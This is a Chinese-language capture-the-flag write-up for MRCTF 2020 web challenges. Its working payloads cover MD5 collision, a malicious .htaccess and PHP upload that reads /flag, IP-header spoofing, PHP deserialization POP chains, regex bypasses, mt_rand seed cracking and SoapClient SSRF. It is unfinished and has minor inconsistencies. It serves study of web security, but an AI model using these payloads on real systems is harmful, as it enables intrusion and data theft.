---
title: MRCTF-wp
date: 2020-03-27 20:38:44
updated: 2020-03-27 20:38:44
tags:
 - ctf 
 - wp
 - 待完成
categories:
 - 刷题
---

# web 

## ez_bypass

打开题目就有源码

<!--more-->

```php
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

payload

```
http://4d316f88-95dd-4d3f-ad11-e41a47f4d4a6.node3.buuoj.cn/?id=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&gg=%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A
```

![](/pic/144.png)



## 你传你🐎呢

文件上传

```http
POST /upload.php HTTP/1.1
Host: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------400560856011615641723368312644
Content-Length: 458
Upgrade-Insecure-Requests: 1

-----------------------------400560856011615641723368312644
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

#define height 12
#define width 12
AddType application/x-httpd-php .jpg
php_value auto_append_file "1.jpg"
-----------------------------400560856011615641723368312644
Content-Disposition: form-data; name="submit"

ä¸é®å»ä¸
-----------------------------400560856011615641723368312644--

```

```http
POST /upload.php HTTP/1.1
Host: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------29705509393397799580693485075
Content-Length: 383
Cookie: PHPSESSID=d7c1fe298429b3461f3a252fc9625491
Upgrade-Insecure-Requests: 1

-----------------------------29705509393397799580693485075
Content-Disposition: form-data; name="uploaded"; filename="../../1.jpg"
Content-Type: image/jpeg

GIF89a
<?php echo file_get_contents("/flag")?>
-----------------------------29705509393397799580693485075
Content-Disposition: form-data; name="submit"

ä¸é®å»ä¸
-----------------------------29705509393397799580693485075--

```

访问url/upload/9af352e703653f2467a045cde806bd86/1.jpg

即可得到flag

## PYwebsite

查看源码，发现有一段js验证

```js
<script>

    function enc(code){
      hash = hex_md5(code);
      return hash;
    }
    function validate(){
      var code = document.getElementById("vcode").value;
      if (code != ""){
        if(hex_md5(code) == "0cd4da0223c0b280829dc3ea458d655c"){
          alert("您通过了验证！");
          window.location = "./flag.php"
        }else{
          alert("你的授权码不正确！");
        }
      }else{
        alert("请输入授权码");
      }
      
    }

  </script>
```

跟随到flag.php，提示记录了IP

![](/pic/145.png)

加一个xff

```http
GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:27983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-For: 127.0.0.1
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```



## Ezpop

打开就是源码，序列化漏洞

```php
 <?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
} 
```

````php
__construct()//当一个对象创建时被调用
__destruct() //当一个对象销毁时被调用
__toString() //当一个对象被当作一个字符串使用
__sleep()//在对象在被序列化之前运行
__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
__get()//获得一个类的成员变量时调用
__set()//设置一个类的成员变量时调用
__invoke()//调用函数的方式调用一个对象时的回应方法
__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
````

pop链  

```
Show::__wakeup()->Show::__toString()->Test::__get()->Modifier::__invoke()->Modifier::append()

preg_match()正则是匹配字符串，传入的是对象，会触发__toString()，$this->str->source  str是Test类，触发__get，属性p是Modifier类，触发__invoke()，include可以利用伪协议包含flag。php源码
```

编写序列化脚本

```
<?php
class Test{
    public $p;
    public function __construct(){
        $this->p = new Modifier();
    }

}
class Modifier {
    protected  $var="php://filter/read=convert.base64-encode/resource=flag.php";
}

class Show{
    public $source;
    public $str;
}

$s=new Show();
$t=new Test();
$s->str=$t;
$s->source=$s;
echo urlencode(serialize($s));
//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D
```

将得到的base64解码即可拿到flag



## 套娃

打开题目查看源码

```html
<!--
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

$_SERVER是不进行urldecode解析的，被ban了%5f,但是可以传%5F

第二个使用%0a（换行）结尾即可绕过  关于[preg_match绕过](https://www.cnblogs.com/20175211lyz/p/12198258.html)

拿到secrettw.php，

查看源码是jencode/*aaencode*(颜文字),刚入ctf那会在南邮平台见过，直接在F12控制台执行即可

得到提示

```
post me Merak
```

然后拿到源码

```php
?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 

function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>
```

对于第一个if  使用client-ip绕过，第二个可以使用php://input绕过

对于chenge写一个解密函数

```php
<?php
function change($v="flag.php"){

    $re = '';
    for($i=0;$i<strlen($v);$i++){
        $re .= chr ( ord ($v[$i]) - $i*2 );
    }
    var_dump(base64_encode($re));
    return $re;
}

change();
?>
```



payload

```http
GET /secrettw.php?2333=php://input&file=ZmpdYSZmXGI= HTTP/1.1
Host: 470d4194-20d2-4996-bf51-da5557926abb.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
client-ip: 127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Length: 20

todat is a happy day
```





## Not  So Web Application









## Ezaudit

扫描目录得到源码www.zip,还有一个login.php

```php
<?php 
header('Content-type:text/html; charset=utf-8');
error_reporting(0);
if(isset($_POST['login'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    $Private_key = $_POST['Private_key'];
    if (($username == '') || ($password == '') ||($Private_key == '')) {
        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
        header('refresh:2; url=login.html');
        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
        exit;
}
    else if($Private_key != '*************' )
    {
        header('refresh:2; url=login.html');
        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
        exit;
    }

    else{
        if($Private_key === '************'){
        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
        $link=mysql_connect("localhost","root","root");
        mysql_select_db("test",$link);
        $result = mysql_query($getuser);
        while($row=mysql_fetch_assoc($result)){
            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
        }
    }
    }

} 
// genarate public_key 
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);  //mt_rand(min,max)  返回随机数
    return $public_key;
  }

  //genarate private_key
  function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
  }
  $Public_key = public_key();
  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???

```

mt_rand种子可以爆破。项目地址https://github.com/lepiaf/php_mt_seed

按照格式生成

```php
strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
strs='KVQP0LdJKRaV3n9D'

for x in range(len(strs)):
    print(strings1.find(strs[x]), end=' ')
    print(strings1.find(strs[x]),'0' ,end=' ')
    print(len(strings1)-1, end=' ')
# 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
```

```bash
% ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62
Found 0, trying 1744830464 - 1778384895, speed 46429762 seeds per second 
seed = 1775196155
Found 1, trying 4261412864 - 4294967295, speed 44036507 seeds per second 
Found 1
```

拿到种子，生成私钥

```php
mt_srand(1775196155);
function public_key($length = 16) {
    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $public_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
    return $public_key;
}
function private_key($length = 12) {
    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $private_key = '';
    for ( $i = 0; $i < $length; $i++ )
        $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
    return $private_key;
}

echo public_key();  //KVQP0LdJKRaV3n9D
echo "\n";
echo private_key();  //XuNhoueCDCGceth0 
```

在login.html使用万能账号登陆

![](/pic/146.png)



## Ezpop_Revenge

扫描目录有源码www.zip

```php
//flag.php
<?php
if(!isset($_SESSION)) session_start();
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){
   $_SESSION['flag']= "MRCTF{******}";
}else echo "我扌your problem?\nonly localhost can get flag!";
?>
```

发现是要ssrf

查看了几个页面后发现Plugin.php中可疑,以下是关键代码

```php
//Plugin.php
...
class HelloWorld_DB{
    private $flag="MRCTF{this_is_a_fake_flag}";
    private $coincidence;
    function  __wakeup(){
        $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']);
    }
}

class HelloWorld_Plugin implements Typecho_Plugin_Interface
{
		 public function action(){
        if(!isset($_SESSION)) session_start();
        if(isset($_REQUEST['admin'])) var_dump($_SESSION);
        if (isset($_POST['C0incid3nc3'])) {
			if(preg_match("/file|assert|eval|[`\'~^?<>$%]+/i",base64_decode($_POST['C0incid3nc3'])) === 0)
				unserialize(base64_decode($_POST['C0incid3nc3']));
			else {
				echo "Not that easy.";
			}
        }
    }
}
```

HelloWorld_Plugin类中如果传入了admin，就打印出session，是反序列化。HelloWorld_DB类中\_\_wakeup函数创建了一个Typecho_Db类，跟进查看

```php
class Typecho_Db
{   
   public function __construct($adapterName, $prefix = 'typecho_')
    {
        /** 获取适配器名称 */
        $this->_adapterName = $adapterName;

        /** 数据库适配器 */
        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;

        if (!call_user_func(array($adapterName, 'isAvailable'))) {
            throw new Typecho_Db_Exception("Adapter {$adapterName} is not available");//__toString()
        }

        $this->_prefix = $prefix;

        /** 初始化内部变量 */
        $this->_pool = array();
        $this->_connectedPool = array();
        $this->_config = array();

        //实例化适配器对象
        $this->_adapter = new $adapterName();
    }
}
```

构造函数这里是字符串拼接，还给了提示，\_\_toString()，搜索\_\_toString()，在Query函数中找到

```php
class Typecho_Db_Query
{
    const KEYWORDS = '*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL';
    private static $_default = array(
        'action' => NULL,
        'table'  => NULL,
        'fields' => '*',
        'join'   => array(),
        'where'  => NULL,
        'limit'  => NULL,
        'offset' => NULL,
        'order'  => NULL,
        'group'  => NULL,
        'having'  => NULL,
        'rows'   => array(),
    );
    private $_adapter;
    private $_sqlPreBuild;
    private $_prefix;
    private $_params = array();
public function __toString()
    {
        switch ($this->_sqlPreBuild['action']) {
            case Typecho_Db::SELECT:
                return $this->_adapter->parseSelect($this->_sqlPreBuild);
            case Typecho_Db::INSERT:
                return 'INSERT INTO '
                . $this->_sqlPreBuild['table']
                . '(' . implode(' , ', array_keys($this->_sqlPreBuild['rows'])) . ')'
                . ' VALUES '
                . '(' . implode(' , ', array_values($this->_sqlPreBuild['rows'])) . ')'
                . $this->_sqlPreBuild['limit'];
            case Typecho_Db::DELETE:
                return 'DELETE FROM '
                . $this->_sqlPreBuild['table']
                . $this->_sqlPreBuild['where'];
            case Typecho_Db::UPDATE:
                $columns = array();
                if (isset($this->_sqlPreBuild['rows'])) {
                    foreach ($this->_sqlPreBuild['rows'] as $key => $val) {
                        $columns[] = "$key = $val";
                    }
                }

                return 'UPDATE '
                . $this->_sqlPreBuild['table']
                . ' SET ' . implode(' , ', $columns)
                . $this->_sqlPreBuild['where'];
            default:
                return NULL;
        }
    }
}
```

找到这里就发现select处可以构造soapclient，进行ssrf。

整理一下pop链

```php
HelloWorld_DB::__wakeup()->Typecho_Db::__construct()->Typecho_Db_Query::__toString()->SoapClient::->__call()
```

有了pop链了，开始写脚本，在写脚本的过程中发现

```php

```



soap类无法传入session，但是使用CRLF注入

> CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。
>
> [参考链接](https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html)

在user-agengt处使用\r\n进行换行

